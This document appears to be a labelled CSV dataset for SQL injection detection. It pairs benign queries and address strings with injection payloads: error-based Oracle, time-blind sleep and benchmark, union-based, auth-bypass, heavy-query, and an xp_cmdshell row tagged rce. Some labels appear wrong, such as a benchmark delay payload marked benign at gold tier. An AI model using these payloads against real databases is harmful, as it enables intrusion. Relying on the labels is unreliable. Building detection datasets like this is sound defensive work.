payload_norm,payload_delex,sqli_type,db_engine,confidence,is_attack,source,tier
"select * from users WHERE username = ""1%\' ) ) and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and username = ""-4256\' ) where 9545 = 9545 or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --""",select * from __IDENT__ where __IDENT__ = __STR__,error_based,oracle,0.9,True,original,silver
"1"" where 1100 = 1100",__INT__ where __INT__ = __INT__,boolean_blind,generic,0.5,True,original,bronze
"1'|| ( select 'wcad' from dual where 4262 = 4262 and elt ( 3114 = 3114,sleep ( 5 ) ) #","__INT__ __STR__ __IDENT__ from dual where __INT__ = __INT__ and __IDENT__ ( __INT__ = __INT__ , sleep ( __INT__ ) ) #",time_blind,mysql,0.7,True,original,bronze
"select * from users WHERE username = ""1\' ) ) and ( ( \'yhku\' like \'yhku"" and username = ""1\' ) )",select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = __INT__ ) ),auth_bypass,generic,0.6,True,original,bronze
"-4955%' union all select 5928,5928--","- __INT__ % ' union all select __INT__ , __INT__ - -",union_based,generic,0.7,True,original,bronze
select ( case when ( 4719 = 8852 ) then 1 else 4719* ( select 4719 from master..sysdatabases ) end ) --,select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ * ( select __INT__ from __IDENT__ ) end ) - -,boolean_blind,mssql,0.7,True,original,bronze
SELECT * FROM completely WHERE bean = 'harder' LIMIT 3,select * from __IDENT__ where __IDENT__ = __STR__ limit __INT__,benign,generic,1.0,False,original,gold
SELECT COUNT ( angry ) FROM everywhere,select count ( __IDENT__ ) from __IDENT__,benign,generic,1.0,False,original,gold
"1 ) as azdb where 4219 = 4219 union all select null,null,null,null#","__INT__ ) as __IDENT__ where __INT__ = __INT__ union all select null , null , null , null",union_based,generic,0.7,True,original,bronze
"SELECT needed AS duck, fire AS [automobile] FROM throughout","select __IDENT__ as __IDENT__ , __IDENT__ as __IDENT__ from __IDENT__",benign,generic,1.0,False,original,gold
"calle daniel florido rodriguez, 105, 2?f","__IDENT__ __IDENT__ __IDENT__ __IDENT__ , __INT__ , __IDENT__",benign,generic,0.9,False,original,silver
",(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END)) ,(SELECT (CASE WHEN ([INFERENCE]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END))",", ( select ( case when ( __IDENT__ = __IDENT__ ) then __INT__ else __IDENT__ * ( select __IDENT__ from __IDENT__ ) end ) ) , ( select ( case when ( __IDENT__ ) then __INT__ else __IDENT__ * ( select __IDENT__ from __IDENT__ ) end ) )",boolean_blind,mysql,0.9,True,original,silver
"-4670"" ) ) or 3038 = 3038",- __INT__ ) ) or __INT__ = __INT__,boolean_blind,generic,0.8,True,original,silver
"1'+ ( select hsef where 4136 = 4136 or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) ) +'",__INT__ __STR__,heavy_query,postgresql,0.7,True,original,bronze
"select * from users WHERE username = ""1\'|| ( select \'tisi\' from dual where 1616 = 1616 and username = ""-2756\' where 6156 = 6156 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" and username = ""-9564 or-- 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --""",select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = __STR__,error_based,oracle,0.9,True,original,silver
SELECT * FROM carbon WHERE organized BETWEEN 'ants' AND 'girl',select * from __IDENT__ where __IDENT__ between __STR__ and __STR__,benign,generic,1.0,False,original,gold
"select * from users WHERE username = ""-7746\' ) ) ) || 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( ( \'itxy\' like \'itxy"" or username = ""-4262%\' ) ) ) || 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) )","select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = "" - __INT__ % __IDENT__ ) ) ) | | __INT__ = __IDENT__ ( ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) )",boolean_blind,oracle,0.8,True,original,silver
"1"" ) ) or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( ( ""vypw"" like ""vypw",__INT__ __STR__ __IDENT__ __STR__ __IDENT__,benign,generic,1.0,False,original,gold
SELECT * FROM master FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM beauty,select * from __IDENT__ fetch first __INT__ rows only select top __INT__ __IDENT__ * from __IDENT__,benign,generic,1.0,False,original,gold
-4410 where 5749 = 5749 or 1317 = 9823--,- __INT__ where __INT__ = __INT__ or __INT__ = __INT__ - -,boolean_blind,generic,0.5,True,original,bronze
"select * from users WHERE username = ""-6661\' ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( \'tbmu\' like \'tbmu"" or username = ""1\'|| ( select \'byxb\' where 8351 = 8351 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) ) ||\'""",select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = __STR__,boolean_blind,oracle,0.9,True,original,silver
SELECT being FROM call UNION SELECT himself FROM taken ORDER BY income,select __IDENT__ from __IDENT__ union select __IDENT__ from __IDENT__ order by __IDENT__,benign,generic,1.0,False,original,gold
"select * from users WHERE username = ""1\' ) ) ) and ( ( ( \'gegg\' = \'gegg"" and username = ""-7565%\' ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) )","select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = "" - __INT__ % __IDENT__ ) or __INT__ in ( ( char ( __INT__ ) + char ( __INT__ ) + char ( __INT__ ) + char ( __INT__ ) + char ( __INT__ ) + ( select ( case when ( __INT__ = __INT__ ) then char ( __INT__ ) else char ( __INT__ ) end ) ) + char ( __INT__ ) + char ( __INT__ ) + char ( __INT__ ) + char ( __INT__ ) + char ( __INT__ ) ) )",error_based,oracle,0.9,True,original,silver
reis,__IDENT__,benign,generic,0.9,False,original,silver
SELECT * FROM progress WHERE east = 'probably' AND ( diagram = 'usually' OR fifth = 'tribe' ),select * from __IDENT__ where __IDENT__ = __STR__ and ( __IDENT__ = __STR__ or __IDENT__ = __STR__ ),benign,generic,1.0,False,original,gold
1 ) as vqbf where 4020 = 4020,__INT__ ) as __IDENT__ where __INT__ = __INT__,boolean_blind,generic,0.8,True,original,silver
"select * from users WHERE username = ""1"" or username = ""1%\' and username = ""-2806\' ) ) )",select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = __INT__ % \ __STR__ ) ) ),auth_bypass,generic,0.6,True,original,bronze
"select * from users WHERE username = ""1\'|| ( select \'vvpn\' from dual where 7011 = 7011 and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) ) ||\'"" and username = ""1\' ) ) )",select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = __INT__ ) ) ),boolean_blind,oracle,0.8,True,original,silver
69082096d,__IDENT__,benign,generic,0.9,False,original,silver
"select * from users WHERE username = ""-7323%"" or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and username = ""1""",select * from __IDENT__ where __IDENT__ = __STR__ or __INT__ = ( select upper ( __IDENT__ ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) ) from dual ) and __IDENT__ = __STR__,error_based,oracle,0.95,True,original,gold
"c/ tamesis 39, 1?c","__IDENT__ / __IDENT__ __INT__ , __IDENT__",benign,generic,0.9,False,original,silver
SELECT needs ( s ) FROM gun FULL OUTER JOIN,select __IDENT__ ( __IDENT__ ) from __IDENT__ full outer join,benign,mysql,0.9,False,original,silver
"-4798%' ) ) ) union all select 3330,3330,3330#","- __INT__ % ' ) ) ) union all select __INT__ , __INT__ , __INT__",union_based,generic,0.7,True,original,bronze
saya,__IDENT__,benign,generic,0.9,False,original,silver
"1"" ) ) and 7533 = 7533 and ( ( ""rnni"" like ""rnni",__INT__ __STR__ __IDENT__ __STR__ __IDENT__,boolean_blind,generic,0.8,True,original,silver
SELECT * FROM careful ORDER BY brass DESC,select * from __IDENT__ order by __IDENT__ desc,benign,generic,1.0,False,original,gold
"select * from users WHERE username = ""1 ) ) as xoch where 8765 = 8765 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" and username = ""-8021\' ) )","select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = "" - __INT__ ) )",error_based,oracle,0.95,True,original,gold
1%' ) ) ) and 3916 = 6327--,__INT__ % ' ) ) ) and __INT__ = __INT__ - -,boolean_blind,generic,0.75,True,original,bronze
"select * from users WHERE username = ""1\' and username = ""-3899\' ) where 8152 = 8152 or username = ""1 or username = ""1\' ) ) and ( ( \'ajka\' = \'ajka""",select * from __IDENT__ where __IDENT__ = __STR__ __INT__ or __IDENT__ = __STR__,auth_bypass,generic,0.5,True,original,bronze
SELECT AVG ( forest ) FROM drop SELECT SUM ( eat ),select avg ( __IDENT__ ) from drop select sum ( __IDENT__ ),benign,generic,1.0,False,original,gold
select case when 2599 = 7035 then 1 else null end--,select case when __INT__ = __INT__ then __INT__ else null end - -,boolean_blind,generic,0.8,True,original,silver
"1"" ) and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #","__INT__ ) and __INT__ = benchmark ( __INT__ , md5 ( __HEX__ ) ) #",benign,generic,1.0,False,original,gold
"1' ) ) ) and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) and ( ( ( 'skdy' = 'skdy",__INT__ __STR__ __IDENT__ __STR__ __IDENT__,benign,generic,1.0,False,original,gold
"1%"" ) ) and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ( ""%"" = """,__INT__ % __STR__ % __STR__,error_based,mysql,0.85,True,original,silver
"select * from users WHERE username = ""1 ) ) and username = ""-5863"" and ( ( 5139 = 5139"" or username = ""-1254""",select * from __IDENT__ where __IDENT__ = __STR__ - __INT__ __STR__ or __IDENT__ = __STR__,error_based,oracle,0.8,True,original,silver
"1"" ) ) as gprr where 5975 = 5975 and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #","__INT__ ) ) as __IDENT__ where __INT__ = __INT__ and __INT__ = benchmark ( __INT__ , md5 ( __HEX__ ) ) #",time_blind,mysql,0.9,True,original,silver
"1' ) ) as lrnh where 8569 = 8569 union all select null,null,null,null,null--","__INT__ ) ) as __IDENT__ where __INT__ = __INT__ union all select null , null , null , null , null - -",union_based,generic,0.7,True,original,bronze
; exec master..xp_cmdshell,; exec __IDENT__,rce,mssql,0.95,True,original,gold
"select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3# kuqm","select count ( * ) from __IDENT__ as __IDENT__ , __IDENT__ as __IDENT__ , __IDENT__ as __IDENT__ __IDENT__",heavy_query,firebird,0.7,True,original,bronze
SELECT AVG ( dull ) FROM view SELECT SUM ( unhappy ),select avg ( __IDENT__ ) from view select sum ( __IDENT__ ),benign,generic,1.0,False,original,gold
"select * from users WHERE username = ""-8007\' ) ) as bgpp where 9555 = 9555 and username = ""-3880 ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( 5194 = 5194""",select * from __IDENT__ where __IDENT__ = __STR__ - __INT__ ) or __INT__ = ( select upper ( __IDENT__ ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) ) from dual ) and ( __INT__ = __INT__,error_based,oracle,0.9,True,original,silver
miramar,__IDENT__,benign,generic,0.9,False,original,silver
"select * from users WHERE username = ""1\' ) where 1502 = 1502 or username = ""1\' and \'fbzo\' like \'fbzo""",select * from __IDENT__ where __IDENT__ = __STR__,auth_bypass,generic,0.9,True,original,silver
"SELECT column1, column2, ... FROM table_name WHERE columnN LIKE pattern ;","select __IDENT__ , __IDENT__ , __IDENT__ from __IDENT__ where __IDENT__ like __IDENT__ ;",benign,mysql,0.9,False,original,silver
bakkum,__IDENT__,benign,generic,0.9,False,original,silver
"-5073"" ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ""kbab"" like ""kbab",- __INT__ __STR__ __IDENT__ __STR__ __IDENT__,boolean_blind,postgresql,0.7,True,original,bronze
SELECT AVG ( build ) FROM gradually,select avg ( __IDENT__ ) from __IDENT__,benign,generic,1.0,False,original,gold
"simancas, 172, 8-d","__IDENT__ , __INT__ , __INT__ - __IDENT__",benign,generic,0.9,False,original,silver
"INSERT INTO solution ( swung, pencil, cup, welcome, those, unhappy ) VALUES ( 'impossible', 'pen'. title', 'weak', 'front', 'judge', 'sets' )","insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__ . __IDENT__ __STR__ __IDENT__ __STR__ __IDENT__ __STR__ __IDENT__ __STR__ __IDENT__ )",benign,generic,1.0,False,original,gold
"SELECT boardID AS ID, advice AS quite FROM automobile","select __IDENT__ as __IDENT__ , __IDENT__ as __IDENT__ from __IDENT__",benign,generic,1.0,False,original,gold
"select * from users WHERE username = ""1\' and username = ""-3899\' ) where 8152 = 8152 and username = ""1"" and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( \'%\' = \'""",select * from __IDENT__ where __IDENT__ = __STR__ __INT__ __STR__,error_based,oracle,0.9,True,original,silver
"select * from users WHERE username = ""-1639 ) ) and ( ( 3318 = 3318"" or username = ""-4582 ) ) as gvfo where 8885 = 8885 or username = ""1""",select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = __STR__ __INT__,auth_bypass,generic,0.6,True,original,bronze
"-9289 ) ) or make_set ( 5101 = 9919,9919 ) and ( ( 8977 = 8977","- __INT__ ) ) or __IDENT__ ( __INT__ = __INT__ , __INT__ ) and ( ( __INT__ = __INT__",boolean_blind,generic,0.8,True,original,silver
SELECT industry ( s ) FROM policeman SELECT world ( s ),select __IDENT__ ( __IDENT__ ) from __IDENT__ select __IDENT__ ( __IDENT__ ),benign,generic,1.0,False,original,gold
"1"" ) as zhlf where 4119 = 4119 or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --","__INT__ ) as __IDENT__ where __INT__ = __INT__ or __INT__ = ( select count ( * ) from __IDENT__ __IDENT__ , __IDENT__ __IDENT__ , __IDENT__ __IDENT__ , __IDENT__ __IDENT__ , __IDENT__ __IDENT__ ) - -",heavy_query,oracle,0.85,True,original,silver
( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1931 = 1931 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ),( select char ( __INT__ ) + char ( __INT__ ) + char ( __INT__ ) + char ( __INT__ ) + char ( __INT__ ) + ( select ( case when ( __INT__ = __INT__ ) then char ( __INT__ ) else char ( __INT__ ) end ) ) + char ( __INT__ ) + char ( __INT__ ) + char ( __INT__ ) + char ( __INT__ ) + char ( __INT__ ) ),boolean_blind,generic,0.8,True,original,silver
"select * from users WHERE username = ""-1641\' ) ) or username = ""1\'+ ( select \'kicv\' where 1976 = 1976 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) ) +\'""",select * from __IDENT__ where __IDENT__ = __STR__,error_based,oracle,0.95,True,original,gold
30666350j,__IDENT__,benign,generic,0.9,False,original,silver
"SELECT worth, seen+ ', ' + wise+ ' ' + remember+ ', ' + comfortable AS needs FROM death","select __IDENT__ , __IDENT__ + __STR__ + __IDENT__ + __STR__ + __IDENT__ + __STR__ + __IDENT__ as __IDENT__ from __IDENT__",benign,generic,1.0,False,original,gold
"select * from users WHERE username = ""1\' ) as wpmv where 1479 = 1479 or username = ""-1985 ) ) ) and ( ( ( 1248 = 1248"" or username = ""-6203\' ) ) )",select * from __IDENT__ where __IDENT__ = __INT__ __STR__ ) ) ),auth_bypass,generic,0.9,True,original,silver
pensosa,__IDENT__,benign,generic,0.9,False,original,silver
"select * from users WHERE username = ""1%\' ) ) ) or username = ""-5062 ) where 7457 = 7457 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --""","select * from __IDENT__ where __IDENT__ = __STR__ - __INT__ ) where __INT__ = __INT__ or __INT__ = ( select upper ( __IDENT__ ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) ) from dual ) - - """,union_based,oracle,0.95,True,original,gold
